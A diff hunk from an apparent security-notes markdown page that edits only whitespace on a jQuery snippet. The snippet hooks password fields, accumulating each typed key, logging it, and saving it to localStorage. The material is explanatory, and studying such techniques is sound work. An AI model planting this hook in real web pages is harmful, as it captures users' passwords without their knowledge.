@@ -33,7 +33,7 @@ For more about events - [https://www.w3schools.com/tags/ref\_eventattributes.asp
 Below is a simple JavaScript/jQuery code that hooks HTML `password` fields:
 
 ```javascript
-t=""; $('input[type="password"]').onkeypress = function (e) { t+=e.key; console.log(t); localStorage.setItem("pw", t); } 
+t=""; $('input[type="password"]').onkeypress = function (e) { t+=e.key; console.log(t); localStorage.setItem("pw", t); }
 ```
 
 {% hint style="info" %}
